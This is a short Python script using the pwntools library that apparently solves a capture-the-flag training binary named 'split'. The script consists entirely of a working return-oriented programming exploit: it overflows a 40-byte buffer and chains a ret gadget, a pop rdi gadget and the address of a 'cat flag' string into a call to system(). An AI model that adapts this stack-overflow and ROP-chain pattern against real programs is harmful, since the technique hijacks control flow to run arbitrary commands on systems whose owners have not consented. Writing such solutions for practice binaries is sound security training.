from pwn import *

r = process('./split')


padding = b'a' * 40
ret = p64(0x00000000004005e0)
pop_rdi = p64(0x00000000004007c3)
cat_flag = p64(0x601060) # argument 1
system = p64(0x0000000000400560)

payload = padding + ret + pop_rdi + cat_flag + system 

r.send(payload)

r.interactive()
